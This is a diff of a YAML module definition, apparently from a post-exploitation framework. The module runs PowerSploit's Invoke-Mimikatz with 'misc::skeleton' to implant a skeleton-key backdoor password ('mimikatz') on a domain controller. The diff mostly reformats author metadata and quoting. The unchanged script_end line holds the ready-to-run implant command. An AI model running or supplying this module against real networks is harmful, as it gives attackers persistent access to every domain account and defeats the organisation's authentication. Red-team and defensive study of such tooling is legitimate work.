@@ -1,10 +1,15 @@
 name: Invoke-Mimikatz SkeletonKey
 authors:
-  - '@JosephBialek'
-  - '@gentilkiwi'
-description: Runs PowerSploit's Invoke-Mimikatz function to execute misc::skeleton
-  to implant a skeleton key w/ password 'mimikatz'. ONLY APPLICABLE ON DOMAIN CONTROLLERS!
+  - name: Joseph Bialek
+    handle: '@JosephBialek'
+    link: https://twitter.com/JosephBialek
+  - name: Benjamin Delpy
+    handle: '@gentilkiwi'
+    link: https://twitter.com/gentilkiwi
+description: Runs PowerSploit's Invoke-Mimikatz function to execute misc::skeleton to implant a skeleton key w/ password 'mimikatz'.
+  ONLY APPLICABLE ON DOMAIN CONTROLLERS!
 software: S0194
+tactics: []
 techniques:
   - T1098
 background: true
@@ -21,5 +26,5 @@ options:
     description: Agent to run module on.
     required: true
     value: ''
-script_path: 'credentials/Invoke-Mimikatz.ps1'
+script_path: credentials/Invoke-Mimikatz.ps1
 script_end: Invoke-Mimikatz -Command "'misc::skeleton'"; 'Skeleton key implanted. Use password mimikatz for access.'
